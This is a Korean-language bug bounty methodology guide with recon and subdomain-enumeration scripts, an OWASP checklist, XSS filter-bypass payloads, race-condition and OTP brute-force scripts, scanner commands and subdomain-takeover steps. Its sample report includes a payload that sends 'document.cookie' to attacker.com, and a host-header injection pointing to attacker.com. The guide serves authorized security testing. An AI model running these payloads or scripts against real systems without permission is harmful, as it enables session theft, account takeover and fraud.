> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 버그바운티 방법론 — 입문부터 High Severity까지

## 0. 초보자를 위한 개념 이해

### 버그바운티란?

버그바운티(Bug Bounty)는 기업이 외부 보안 연구자에게 자사 서비스의 취약점을 발견·보고하면 보상금을 지급하는 프로그램입니다. 합법적인 해킹 기술 연습과 실전 경험, 수익을 동시에 얻을 수 있는 보안 입문자의 최고 등용문입니다. 단순한 아르바이트가 아니라 세계적인 보안 전문가들도 참여하는 수준 높은 경쟁 무대입니다.

**왜 배우는가:**
```
버그바운티 참여 이점:

  보안 연구자                  기업
  ──────────────────────────────────────────────
  합법적 실전 해킹 연습         내부 팀이 놓친 취약점 발굴
  $50 ~ $50,000+ 보상금        보안 강화 비용 절감
  포트폴리오 & 명성 구축        글로벌 전문가 네트워크 활용
  OSCP/CISA 등 자격증 기반      책임 공개(Responsible Disclosure)
```

### 핵심 개념 정리

```
버그바운티 핵심 용어:

  Scope         — 테스트 허용 대상 (도메인, IP 범위)
  Out of Scope  — 절대 테스트 금지 대상
  CVSS          — 취약점 심각도 점수 (0.0~10.0)
  PoC           — Proof of Concept (취약점 증명 코드)
  Duplicate     — 이미 보고된 중복 취약점 (보상 없음)
  Triage        — 접수된 보고서 검토/분류 과정
  Hall of Fame  — 발견자 명예 등재 (보상 없는 감사 표시)

심각도별 보상 범위 (일반):
  Critical  (CVSS 9.0~10) → $5,000 ~ $50,000+
  High      (CVSS 7.0~8.9) → $1,000 ~ $10,000
  Medium    (CVSS 4.0~6.9) → $200 ~ $2,000
  Low       (CVSS 0.1~3.9) → $50 ~ $500
```

### 필요한 도구 및 환경
- **Burp Suite Community**: HTTP 프록시 및 인터셉터
- **subfinder / amass**: 서브도메인 탐색 도구
- **httpx**: 활성 호스트 확인 도구
- **nuclei**: 자동 취약점 스캐너 (YAML 기반 템플릿)

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""버그바운티 정찰 — 서브도메인 목록에서 활성 호스트 확인."""

import asyncio
from dataclasses import dataclass

import httpx


@dataclass
class HostResult:
    domain: str
    status_code: int
    title: str
    is_alive: bool


async def check_host(client: httpx.AsyncClient, domain: str) -> HostResult:
    """단일 도메인 생존 여부 및 기본 정보 확인."""
    url = f"https://{domain}"
    try:
        resp = await client.get(url, follow_redirects=True, timeout=5.0)
        # HTML 제목 추출
        title = ""
        if b"<title>" in resp.content:
            start = resp.content.find(b"<title>") + 7
            end = resp.content.find(b"</title>", start)
            title = resp.content[start:end].decode(errors="ignore").strip()
        return HostResult(domain, resp.status_code, title, True)
    except (httpx.TimeoutException, httpx.ConnectError):
        return HostResult(domain, 0, "", False)


async def scan_subdomains(domains: list[str]) -> list[HostResult]:
    """여러 서브도메인 병렬 스캔."""
    async with httpx.AsyncClient(verify=False) as client:
        tasks = [check_host(client, d) for d in domains]
        return await asyncio.gather(*tasks)


if __name__ == "__main__":
    targets = ["www.example.com", "api.example.com", "admin.example.com"]
    results = asyncio.run(scan_subdomains(targets))
    for r in results:
        if r.is_alive:
            print(f"[{r.status_code}] {r.domain} — {r.title}")
```

---

## 1. 버그바운티란

```
기업이 자사 서비스의 취약점을 발견한 외부 연구자에게 보상금 지급하는 프로그램

장점:
  연구자 → 합법적으로 해킹 기술 실전 적용 + 수익
  기업   → 내부 팀으로 찾기 어려운 취약점 발굴

주요 플랫폼:
  HackerOne   : hackerone.com  (가장 큰 플랫폼, Meta·Twitter·Uber 등)
  Bugcrowd    : bugcrowd.com   (NASA, Mastercard 등)
  Intigriti   : intigriti.com  (유럽 중심)
  Synack       : synack.com    (초청제, 고급 연구자 대상)
  자체 프로그램 : Google VRP, Microsoft MSRC, Apple Security Bounty
```

---

## 2. 플랫폼별 시작 방법

### HackerOne 시작
```
1. hackerone.com 가입
2. Hacker101 CTF (무료 교육 + 포인트 적립)
   → 포인트 쌓으면 비공개 프로그램 초대
3. 공개 프로그램 → Scope 범위 확인 후 시작
4. Reputation 쌓기 → 비공개(Private) 프로그램 접근

권장 첫 타겟:
  - 비교적 넓은 스코프의 프로그램
  - 자산이 많은 대기업 (서브도메인 많음)
  - 오래됐지만 활발한 프로그램
```

### 보상금 기준 (참고)
```
Critical  (CVSS 9.0~10.0) : $5,000 ~ $50,000+
High      (CVSS 7.0~8.9)  : $1,000 ~ $10,000
Medium    (CVSS 4.0~6.9)  : $200  ~ $2,000
Low       (CVSS 0.1~3.9)  : $50   ~ $500
Informational             : 보통 무보상, 감사 표시
```

---

## 3. 정찰 (Recon) — 자산 발굴

### 3-1. 서브도메인 열거

서브도메인을 열거하는 Python 스크립트입니다. Subfinder, Amass 결과와 DNS 브루트포스를 결합하여 공격 표면을 최대한 파악합니다.

```python
#!/usr/bin/env python3
"""
버그바운티 서브도메인 열거 자동화 파이프라인
요구사항: pip install requests dnspython aiohttp
외부 바이너리 (선택): subfinder, amass, httpx
"""

from __future__ import annotations

import argparse
import asyncio
import json
import subprocess
import sys
import textwrap
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

import requests


# ── crt.sh ───────────────────────────────────────────────────────────────────

def crtsh_enum(domain: str) -> set[str]:
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    try:
        data = requests.get(url, timeout=20).json()
        subs: set[str] = set()
        for entry in data:
            for name in entry.get("name_value", "").splitlines():
                name = name.strip().lstrip("*.")
                if name.endswith(domain) and " " not in name:
                    subs.add(name)
        return subs
    except Exception as exc:
        print(f"[!] crt.sh: {exc}")
        return set()


def subfinder_enum(domain: str) -> set[str]:
    try:
        out = subprocess.check_output(
            ["subfinder", "-d", domain, "-all", "-silent"],
            stderr=subprocess.DEVNULL, timeout=120,
        )
        return {l.strip() for l in out.decode().splitlines() if l.strip()}
    except FileNotFoundError:
        print("[!] subfinder 없음")
        return set()
    except Exception:
        return set()


def amass_enum(domain: str, passive: bool = True) -> set[str]:
    cmd = ["amass", "enum", "-d", domain] + (["-passive"] if passive else [])
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=300)
        return {l.strip() for l in out.decode().splitlines() if l.strip()}
    except FileNotFoundError:
        print("[!] amass 없음")
        return set()
    except Exception:
        return set()


# ── DNS 확인 ─────────────────────────────────────────────────────────────────

def resolve_a(subdomain: str) -> Optional[list[str]]:
    try:
        import dns.resolver
        r = dns.resolver.Resolver()
        r.timeout = r.lifetime = 3
        return [str(a) for a in r.resolve(subdomain, "A")]
    except Exception:
        return None


# ── HTTP 생존 확인 ────────────────────────────────────────────────────────────

def check_http(subdomain: str) -> Optional[dict]:
    """HTTP/HTTPS 생존 확인 + 기본 정보 수집."""
    for scheme in ("https", "http"):
        url = f"{scheme}://{subdomain}"
        try:
            resp = requests.get(url, timeout=8, allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0"}, verify=False)
            server = resp.headers.get("Server", "")
            powered = resp.headers.get("X-Powered-By", "")
            title_start = resp.text.find("<title>")
            title_end = resp.text.find("</title>")
            title = resp.text[title_start + 7:title_end].strip() if title_start != -1 else ""
            return {
                "url": resp.url,
                "status": resp.status_code,
                "title": title[:80],
                "server": server,
                "powered_by": powered,
                "content_length": len(resp.content),
            }
        except Exception:
            continue
    return None


# ── 서브도메인 탈취 탐지 ──────────────────────────────────────────────────────

TAKEOVER_FINGERPRINTS = {
    "github.io": "There isn't a GitHub Pages site here",
    "s3.amazonaws.com": "NoSuchBucket",
    "herokuapp.com": "No such app",
    "azurewebsites.net": "404 Web Site not found",
    "cloudfront.net": "The request could not be satisfied",
    "ghost.io": "The thing you were looking for is no longer here",
    "zendesk.com": "Help Center Closed",
    "shopify.com": "Sorry, this shop is currently unavailable",
    "fastly.net": "Fastly error: unknown domain",
}


def check_takeover(subdomain: str) -> Optional[str]:
    """CNAME이 미등록 외부 서비스를 가리키는지 확인."""
    try:
        import dns.resolver
        answers = dns.resolver.resolve(subdomain, "CNAME")
        cname = str(answers[0].target).rstrip(".")
        for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
            if service in cname:
                try:
                    resp = requests.get(f"https://{subdomain}", timeout=8, verify=False)
                    if fingerprint.lower() in resp.text.lower():
                        return f"TAKEOVER 가능: {cname} ({service})"
                except Exception:
                    pass
    except Exception:
        pass
    return None


# ── 결과 관리 ─────────────────────────────────────────────────────────────────

@dataclass
class SubInfo:
    subdomain: str
    ips: list[str] = field(default_factory=list)
    http_info: Optional[dict] = None
    takeover: Optional[str] = None

    @property
    def alive(self) -> bool:
        return self.http_info is not None


def run_pipeline(
    domain: str,
    use_amass: bool = False,
    check_alive: bool = True,
    check_takeovers: bool = True,
    workers: int = 30,
) -> list[SubInfo]:
    all_subs: set[str] = set()

    print("[*] crt.sh 열거 중...")
    all_subs |= crtsh_enum(domain)
    print(f"    crt.sh: {len(all_subs)}개")

    print("[*] subfinder 실행 중...")
    sf = subfinder_enum(domain)
    all_subs |= sf
    print(f"    subfinder: {len(sf)}개 | 누적: {len(all_subs)}개")

    if use_amass:
        print("[*] amass 실행 중 (느림)...")
        am = amass_enum(domain)
        all_subs |= am
        print(f"    amass: {len(am)}개 | 누적: {len(all_subs)}개")

    print(f"\n[+] 중복 제거 후: {len(all_subs)}개")

    results: list[SubInfo] = []

    # DNS 확인
    try:
        import dns.resolver  # noqa
        print(f"[*] DNS 확인 중 ({workers} workers)...")
        with ThreadPoolExecutor(max_workers=workers) as pool:
            future_map = {pool.submit(resolve_a, s): s for s in sorted(all_subs)}
            for future in as_completed(future_map):
                sub = future_map[future]
                ips = future.result() or []
                results.append(SubInfo(subdomain=sub, ips=ips))
    except ImportError:
        results = [SubInfo(subdomain=s) for s in sorted(all_subs)]

    if check_alive:
        print(f"[*] HTTP 생존 확인 중 ({workers} workers)...")
        import urllib3
        urllib3.disable_warnings()
        with ThreadPoolExecutor(max_workers=workers) as pool:
            future_map = {pool.submit(check_http, r.subdomain): r for r in results}
            for future in as_completed(future_map):
                rec = future_map[future]
                rec.http_info = future.result()

    if check_takeovers:
        print("[*] 서브도메인 탈취 취약점 확인 중...")
        with ThreadPoolExecutor(max_workers=20) as pool:
            future_map = {pool.submit(check_takeover, r.subdomain): r for r in results}
            for future in as_completed(future_map):
                rec = future_map[future]
                rec.takeover = future.result()

    return sorted(results, key=lambda r: (not r.alive, r.subdomain))


def save_results(results: list[SubInfo], out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)

    (out_dir / "all.txt").write_text(
        "\n".join(r.subdomain for r in results), encoding="utf-8"
    )
    alive = [r for r in results if r.alive]
    (out_dir / "alive.txt").write_text(
        "\n".join(r.subdomain for r in alive), encoding="utf-8"
    )
    takeovers = [r for r in results if r.takeover]
    if takeovers:
        (out_dir / "takeovers.txt").write_text(
            "\n".join(f"{r.subdomain}: {r.takeover}" for r in takeovers),
            encoding="utf-8",
        )
        print(f"\n[!] 서브도메인 탈취 후보: {len(takeovers)}개 → {out_dir}/takeovers.txt")

    json_data = [
        {
            "subdomain": r.subdomain,
            "ips": r.ips,
            "alive": r.alive,
            "http": r.http_info,
            "takeover": r.takeover,
        }
        for r in results
    ]
    (out_dir / "results.json").write_text(
        json.dumps(json_data, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(f"[+] 저장: {out_dir}/ | 전체: {len(results)} | 응답: {len(alive)}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="버그바운티 서브도메인 열거 자동화 파이프라인",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사용 예시:
              python subdomain_pipeline.py -d target.com
              python subdomain_pipeline.py -d target.com --amass --no-takeover
              python subdomain_pipeline.py -d target.com -o ./recon/ -w 50
            """
        ),
    )
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("--amass", action="store_true", help="amass 포함 (느림)")
    parser.add_argument("--no-alive", action="store_true", help="HTTP 생존 확인 건너뜀")
    parser.add_argument("--no-takeover", action="store_true", help="탈취 확인 건너뜀")
    parser.add_argument("-w", "--workers", type=int, default=30)
    parser.add_argument("-o", "--output", type=Path, default=None)
    args = parser.parse_args()

    out_dir = args.output or Path(f"recon_{args.domain}")
    results = run_pipeline(
        domain=args.domain,
        use_amass=args.amass,
        check_alive=not args.no_alive,
        check_takeovers=not args.no_takeover,
        workers=args.workers,
    )

    for r in results[:20]:
        status = f"[{r.http_info['status']}] {r.http_info['title'][:40]}" if r.alive else "[dead]"
        to = f" !! {r.takeover}" if r.takeover else ""
        print(f"  {r.subdomain:<50} {status}{to}")
    if len(results) > 20:
        print(f"  ... 외 {len(results) - 20}개")

    save_results(results, out_dir)


if __name__ == "__main__":
    main()
```

### 3-2. URL/파라미터 수집

```bash
# waybackurls (아카이브에서 URL)
echo "target.com" | waybackurls | tee wayback_urls.txt

# gau (다양한 소스)
gau target.com | tee gau_urls.txt

# katana (크롤러)
katana -u https://target.com -d 5 -o katana_urls.txt

# 파라미터만 추출
cat wayback_urls.txt gau_urls.txt | grep "?" | qsreplace FUZZ | sort -u > params.txt

# JS 파일에서 엔드포인트 추출
cat live_subs.txt | getJS | grep "\.js$" | xargs -I{} sh -c 'curl -s {} | python3 -m jsbeautifier | grep -E "api|endpoint|route|path"'
```

### 3-3. 기술 스택 파악

whatweb으로 대상 웹사이트의 기술 스택을 파악합니다. CMS, 프레임워크, 서버 소프트웨어 정보를 통해 해당 기술의 알려진 취약점을 조사합니다.

```bash
# whatweb
whatweb https://target.com -a 3

# wappalyzer CLI
npx wappalyzer https://target.com

# nuclei 기술 탐지
nuclei -u https://target.com -t technologies/ -o tech.txt

# HTTP 응답 헤더 분석
curl -I https://target.com 2>/dev/null | grep -E "Server|X-Powered|X-Framework|Via"
```

---

## 4. 취약점 발굴 전략

### 4-1. OWASP Top 10 체크리스트

```
각 자산마다 빠르게 확인할 항목:

□ Broken Access Control
  - /admin, /dashboard, /api/users/{id} 직접 접근
  - 다른 사용자 ID로 교체 (IDOR: Insecure Direct Object Reference)
  - 권한이 필요한 기능을 일반 계정으로 접근

□ SQL Injection
  - 파라미터에 ' 삽입 → 오류 확인
  - 정렬/검색 파라미터 (ORDER BY, 검색어)
  - JSON 파라미터, 헤더 (X-Forwarded-For, User-Agent)

□ XSS (Cross-Site Scripting)
  - 검색어, 댓글, 프로필 이름, 에러 메시지
  - DOM 기반: URL fragment (#), location.hash
  - 필터 우회: SVG, 이벤트 핸들러, base64

□ 인증/세션 취약점
  - 비밀번호 재설정 로직 (토큰 재사용, 예측 가능)
  - 2FA 우회 (레이스 컨디션, 재사용)
  - JWT: alg:none, HS256→RS256 혼동, 비밀키 브루트포스

□ SSRF
  - URL 입력 받는 기능 (썸네일, 웹훅, PDF 생성)
  - http://169.254.169.254/ 클라우드 메타데이터
  - 내부망 탐색

□ 파일 업로드
  - Content-Type 변조, 확장자 필터 우회
  - 업로드 경로 유추 → 웹쉘 실행

□ IDOR (Broken Access Control 세부)
  - 숫자 ID를 다른 숫자로 변경
  - UUID는 어디서 새는지 확인
  - API 엔드포인트: GET /api/orders/12345
```

### 4-2. IDOR — 버그바운티에서 가장 많이 나오는 취약점

```
IDOR (Insecure Direct Object Reference):
다른 사용자의 리소스에 직접 접근 가능한 취약점

발굴 방법:
1. 계정 2개 생성 (Account A, Account B)
2. Account A로 로그인 → 자신의 리소스 URL 확인
   예: GET /api/v1/users/1001/profile
3. Account B 세션으로 Account A URL 접근
   → 접근 가능하면 IDOR!

찾기 좋은 곳:
- 프로필 수정/조회
- 주문 내역, 결제 정보
- 파일 다운로드
- API 엔드포인트 (숫자 ID, UUID)
- 이메일 수신함

자동화:
# Autorize (Burp Suite 확장)
# 두 세션 설정 → 모든 요청 자동으로 권한 확인
```

### 4-3. XSS — 필터 우회 전략

```
기본 테스트:
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

필터 우회:
# HTML 태그 필터링 시
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<video autoplay onloadstart=alert(1) src=x>

# script 키워드 필터링 시
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg><use href="data:image/svg+xml;base64,...#x"/></svg>

# XSS 파이어폴 우회
<scRiPt>alert(1)</scRiPt>
<script/x>alert(1)</script>
<script>/*</script><script>*/alert(1)</script>

# DOM XSS 탐지
# Burp DOM Invader 사용
# 카나리 문자열 주입 후 JS 소스에서 추적
```

### 4-4. 비밀번호 재설정 취약점

```
취약한 패턴들:

[1] 토큰 재사용
   - 비밀번호 재설정 후 이전 토큰으로 다시 변경 가능?

[2] 토큰 무한 유효
   - 오래된 토큰이 만료되지 않는 경우

[3] 레이스 컨디션
   - 동시에 여러 재설정 요청 → 같은 토큰이 여러 계정에?

[4] Host Header Injection
   POST /reset-password HTTP/1.1
   Host: attacker.com
   → 이메일에 attacker.com 링크 발송

[5] 예측 가능한 토큰
   - 시간 기반 (timestamp MD5)
   - 사용자 ID 기반
```

---

## 5. Burp Suite 버그바운티 설정

### 5-1. 필수 확장 플러그인

```
BApp Store에서 설치:

1. Autorize          → IDOR/권한 확인 자동화
2. Param Miner       → 숨겨진 파라미터 자동 발굴
3. Retire.js         → 취약한 JS 라이브러리 탐지
4. J2EEScan          → Java 특화 취약점
5. Active Scan++     → 활성 스캔 강화
6. Reflected Parameters → 반사형 파라미터 추적
7. Error Message Checks → 에러 메시지 정보 누수
8. Software Vulnerability Scanner → CVE 매핑
9. Turbo Intruder    → 고속 브루트포서 (레이스 컨디션)
10. Logger++         → 모든 요청 로깅
```

### 5-2. 범위(Scope) 설정


버그 바운티 프로그램의 범위(Scope)를 먼저 정확히 확인하는 것이 필수입니다. 범위 밖 시스템을 테스트하면 법적 문제가 발생할 수 있으며, 대부분의 플랫폼은 In-scope/Out-of-scope를 명확히 구분하여 공지합니다.

```
Target → Scope 설정:
1. Add → 타겟 도메인 추가
2. 서브도메인 와일드카드: .*\.target\.com$
3. Spider와 Scanner를 스코프 내로 제한

중요: 스코프 밖 요청 절대 금지!
→ HackerOne 규정 위반 → 계정 정지 위험
```

### 5-3. Turbo Intruder로 레이스 컨디션

Turbo Intruder 스크립트로 레이스 컨디션 취약점을 익스플로잇합니다. 쿠폰 중복 사용, 잔액 초과 출금 등 동시 요청 처리 오류를 테스트합니다.

```python
# race_condition_coupon.py — Turbo Intruder 스크립트
# 쿠폰 코드 중복 사용 / 포인트 중복 적립 테스트
#
# 사용법: Burp Suite Repeater에서 요청 선택
#         Extensions > Turbo Intruder > Send to Turbo Intruder
#         이 스크립트를 붙여넣고 Attack 클릭
#
# gate 방식: 모든 요청을 큐에 넣은 뒤 동시에 전송 (HTTP/1 pipeline)

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,   # 동시 연결 수 (높을수록 레이스 효과)
        requestsPerConnection=1,
        pipeline=False,             # HTTP/2 환경이면 True로 변경
        engine=Engine.THREADED,
    )

    # gate 방식: 모든 요청을 큐에 등록한 뒤 동시 해제
    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=20)


def handleResponse(req, interesting):
    # 성공 응답(200, "success", "applied" 등)만 테이블에 추가
    if req.status == 200 and any(
        kw in req.response.lower()
        for kw in ('success', 'applied', 'redeemed', 'credited', 'ok')
    ):
        table.add(req)
```

```python
#!/usr/bin/env python3
"""
레이스 컨디션 테스트 — requests-futures 기반 독립 실행 버전
요구사항: pip install requests
"""

from __future__ import annotations

import argparse
import json
import sys
import textwrap
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import requests


def race_test(
    url: str,
    method: str = "POST",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    count: int = 30,
    workers: int = 30,
    success_codes: list[int] | None = None,
    success_keywords: list[str] | None = None,
) -> list[dict[str, Any]]:
    """동시 요청을 보내 레이스 컨디션 취약점 확인."""

    success_codes = success_codes or [200, 201]
    success_keywords = success_keywords or ["success", "ok", "applied", "credited"]
    default_headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if headers:
        default_headers.update(headers)

    wins: list[dict[str, Any]] = []

    def send_request(idx: int) -> dict[str, Any]:
        try:
            kwargs: dict[str, Any] = {
                "headers": default_headers,
                "timeout": 15,
                "verify": False,
            }
            if body:
                kwargs["data"] = body
            resp = getattr(requests, method.lower())(url, **kwargs)
            text_lower = resp.text.lower()
            hit = resp.status_code in success_codes and any(
                kw in text_lower for kw in success_keywords
            )
            return {
                "idx": idx,
                "status": resp.status_code,
                "length": len(resp.content),
                "time_ms": int(resp.elapsed.total_seconds() * 1000),
                "hit": hit,
                "snippet": resp.text[:100],
            }
        except requests.RequestException as exc:
            return {"idx": idx, "error": str(exc), "hit": False}

    print(f"[*] 레이스 컨디션 테스트: {count}개 동시 요청 → {url}")
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(send_request, i) for i in range(count)]
        for future in as_completed(futures):
            result = future.result()
            if result.get("hit"):
                wins.append(result)

    return wins


def main() -> None:
    parser = argparse.ArgumentParser(
        description="레이스 컨디션 취약점 테스트",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사용 예시:
              # 쿠폰 중복 적용 테스트
              python race_test.py -u https://target.com/api/coupon/apply \\
                  -X POST -d '{"code":"SAVE10"}' \\
                  -H 'Authorization: Bearer TOKEN' --count 30

              # OTP 브루트포스 레이스
              python race_test.py -u https://target.com/api/verify-otp \\
                  -X POST -d '{"otp":"123456"}' --count 20
            """
        ),
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-X", "--method", default="POST")
    parser.add_argument("-d", "--data", default=None, help="요청 바디")
    parser.add_argument(
        "-H", "--header", action="append", default=[],
        metavar="KEY:VALUE", help="추가 헤더 (여러 번 사용 가능)",
    )
    parser.add_argument("--count", type=int, default=30, help="동시 요청 수")
    parser.add_argument("--workers", type=int, default=30)
    parser.add_argument(
        "--keywords", nargs="+",
        default=["success", "ok", "applied", "credited"],
        help="성공 키워드",
    )
    args = parser.parse_args()

    headers: dict[str, str] = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    import urllib3
    urllib3.disable_warnings()

    wins = race_test(
        url=args.url,
        method=args.method,
        headers=headers or None,
        body=args.data,
        count=args.count,
        workers=args.workers,
        success_keywords=args.keywords,
    )

    print(f"\n[+] 성공 응답: {len(wins)}개 / {args.count}개")
    if len(wins) > 1:
        print("[!] 레이스 컨디션 취약점 의심! 복수 성공 응답 확인됨.")
        for w in wins:
            print(f"    [{w['idx']}] {w.get('status')} | {w.get('length')}B | {w.get('snippet', '')[:60]}")
    elif len(wins) == 0:
        print("[*] 레이스 컨디션 미탐지 — 더 많은 동시 요청 또는 다른 엔드포인트 시도")
    else:
        print("[*] 단일 성공 — 정상 동작")


if __name__ == "__main__":
    main()
```

---

## 6. 리포트 작성 — 수락률 높이는 방법

### 6-1. 좋은 리포트 구조

버그 바운티 리포트의 표준 구조입니다. 취약점 요약, 재현 단계, 영향도, PoC, 수정 제안을 명확히 작성해야 높은 보상을 받을 수 있습니다.

```markdown
## 취약점 요약
[취약점 유형] in [컴포넌트] — [한 줄 영향 요약]
예: Stored XSS in /profile/bio allows Session Hijacking

## 심각도: High (CVSS 3.1: 8.1)

## 영향
- 공격자가 피해자의 세션 쿠키를 탈취하여 계정 탈취 가능
- 관리자 계정 탈취 시 전체 시스템 위협

## 취약한 엔드포인트
POST /api/v1/profile/update
파라미터: bio

## 재현 단계
1. 피해자 계정으로 로그인
2. 프로필 수정 → bio 필드에 다음 입력:
   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
3. 변경 저장
4. 다른 사용자가 프로필 방문 시 쿠키 자동 전송

## PoC
[스크린샷 또는 영상 첨부]
쿠키 수신 서버 로그:
[2024-01-15 10:23:45] GET /?c=sessionid=abc123def456

## 수정 권고
bio 필드 저장 시 HTML 특수문자 인코딩:
& → &amp;  < → &lt;  > → &gt;  " → &quot;

## 참고
- OWASP: https://owasp.org/www-community/attacks/xss/
- CWE-79: Improper Neutralization of Input
```

### 6-2. 거절 피하는 방법

```
자주 거절되는 이유:

✗ "Self-XSS" — 자신의 계정에만 영향
  → 반드시 다른 사용자에게 영향을 미쳐야 함

✗ "Missing security header" (정보성)
  → 실제 익스플로잇 가능성 증명 필요

✗ "Rate limiting not implemented"
  → 실제 공격 시나리오와 영향 구체화 필요

✗ "Out of scope"
  → 항상 scope 먼저 확인

✗ "Already known" (duplicate)
  → 제보 전 유사 보고서 검색

✗ 재현 불가
  → 단계별 상세 기록, 스크린샷/영상 첨부 필수
```

---

## 7. 자동화 도구 모음


Nuclei는 YAML 기반 템플릿으로 웹 취약점을 빠르게 스캔하는 도구입니다. ProjectDiscovery가 관리하는 공개 템플릿 저장소를 활용하면 CVE, 설정 오류, 노출된 파일 등을 대규모로 탐지할 수 있습니다.

```bash
# Nuclei — 다목적 취약점 스캐너 (템플릿 기반)
nuclei -u https://target.com -t cves/ -o nuclei_cves.txt
nuclei -u https://target.com -t exposures/ -severity high,critical
nuclei -l live_subs.txt -t vulnerabilities/ -rate-limit 50

# ffuf — 웹 퍼저
# 디렉토리
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -u https://target.com/FUZZ -mc 200,301,302 -o dirs.json

# 파라미터
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target.com/page?FUZZ=test" -mc 200 -fs [기본크기]

# 서브도메인 VHOST
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" \
     -u https://target.com -mc 200 -fs [기본크기]

# dalfox — XSS 자동화
dalfox url "https://target.com/search?q=FUZZ"
dalfox file params.txt --deep-domxss

# sqlmap (허가된 대상만)
sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3

# gitleaks — GitHub 비밀 정보 탐지
gitleaks detect --source /path/to/repo
gitleaks github --org=target-company

# trufflehog
trufflehog git https://github.com/target-org/target-repo
```

---

## 8. 버그바운티 수익화 전략

```
초보자 전략:
1. HackerOne Hacker101 CTF 완료 → 비공개 프로그램 초대 획득
2. 낮은 경쟁의 새 프로그램 노리기
3. 넓은 스코프 프로그램 우선
4. 서브도메인 중 잘 관리 안 되는 것 집중

중급자 전략:
1. 자동화 파이프라인 구축 (amass → httpx → nuclei)
2. 프로그램 역사 분석 (과거 제보 패턴 파악)
3. 특정 기술 스택 특화 (GraphQL, OAuth, JWT 등)
4. 체이닝으로 High/Critical 올리기

체이닝 예시:
SSRF (Medium) + AWS 메타데이터 접근 (High) + IAM 자격증명 탈취 (Critical)
정보 노출 (Low) + 계정 탈취로 연결 (High)
```

---

## 8-2. CMS 해킹 방법론 (Bug Bounty 관점)

### WordPress 취약점 탐지

WPScan으로 WordPress 사이트의 취약한 플러그인, 테마, 사용자 계정을 열거합니다. 가장 광범위하게 사용되는 CMS이므로 버그 바운티에서 자주 대상이 됩니다.

```bash
# WPScan — WordPress 전용 취약점 스캐너
wpscan --url https://target.com
wpscan --url https://target.com --enumerate p  # 플러그인 열거
wpscan --url https://target.com --enumerate u  # 사용자 열거
wpscan --url https://target.com -P wordlist.txt --username admin  # 패스워드 브루트포스

# 플러그인 버전 확인 → ExploitDB 검색
wpscan --url https://target.com --enumerate p --plugins-detection aggressive

# XML-RPC 취약점 확인
curl -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
# XML-RPC 활성화 시 → 브루트포스, SSRF 등에 활용 가능
```

### Drupal / Joomla 취약점 탐지

Droopescan으로 Drupal/Joomla CMS의 버전과 플러그인을 열거합니다. Drupalgeddon 등 알려진 RCE 취약점을 확인합니다.

```bash
# Droopescan — Drupal 스캐너
droopescan scan drupal -u https://target.com

# Joomscan — Joomla 스캐너
joomscan -u https://target.com

# 공통 CMS 취약점 탐색 (Nuclei)
nuclei -u https://target.com -tags cms,wordpress,drupal,joomla
```

### 알려진 취약점(1-day) 활용 방법론
```
1. 기술 스택 식별
   → Wappalyzer, WhatWeb, HTTP 응답 헤더 분석

2. 버전 특정
   → /readme.txt, /CHANGELOG.txt, /admin/modules 경로 확인
   → HTTP 응답의 X-Powered-By, Generator 메타태그

3. 취약점 검색
   → searchsploit "[CMS명] [버전]"
   → https://nvd.nist.gov/vuln/search
   → https://www.exploit-db.com/
   → GitHub: site:github.com "CVE-20XX-XXXXX"

4. POC 확보 및 테스트
   → GitHub에서 POC 코드 검색 (신뢰할 수 없는 POC 주의!)
   → 로컬 테스트 환경에서 먼저 검증

5. 1-day 추적 전략
   → ExploitDB RSS, Twitter 위협 피드 모니터링
   → 새 CVE 발표 후 빠르게 타겟 스캔 (패치 전 타임윈도우)
```

---

## 8-3. GitHub / 서브도메인 탈취 (Subdomain Takeover)

서브도메인 탈취(Subdomain Takeover) 취약점을 탐지합니다. CNAME이 삭제된 외부 서비스를 가리키는 서브도메인을 공격자가 등록할 수 있습니다.

```bash
# 서브도메인 탈취 취약점 탐지
# CNAME이 외부 서비스를 가리키지만 해당 서비스에 등록 안 된 경우

# 취약한 패턴 확인
dig sub.target.com CNAME
# → CNAME: some-name.github.io (GitHub Pages, 미등록)
# → CNAME: bucket.s3.amazonaws.com (S3, 미생성)
# → CNAME: target.herokuapp.com (Heroku, 미등록)

# 자동 탐지 도구
subjack -w subdomains.txt -t 100 -o takeover_results.txt
subzy run --targets subdomains.txt

# GitHub Pages 탈취 (CNAME 미등록 시)
# 1. GitHub 계정 생성
# 2. 동일한 이름의 저장소 생성
# 3. GitHub Pages 활성화
# 4. 타겟 서브도메인이 공격자 페이지를 가리킴

